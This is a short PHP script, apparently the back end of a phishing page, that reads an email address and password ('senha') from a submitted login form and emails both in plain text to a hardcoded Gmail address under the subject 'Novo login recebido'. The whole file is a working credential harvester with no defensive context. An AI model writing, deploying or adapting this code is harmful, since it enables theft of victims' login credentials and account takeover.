<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = $_POST['email'];
  $senha = $_POST['senha'];
  $to = "euandyjorge5@gmail.com";
  $subject = "Novo login recebido";
  $body = "Email: $email\nSenha: $senha";

  if (mail($to, $subject, $body)) {
    echo "Dados enviados com sucesso!";
  } else {
    echo "Erro ao enviar os dados.";
  }
}
?>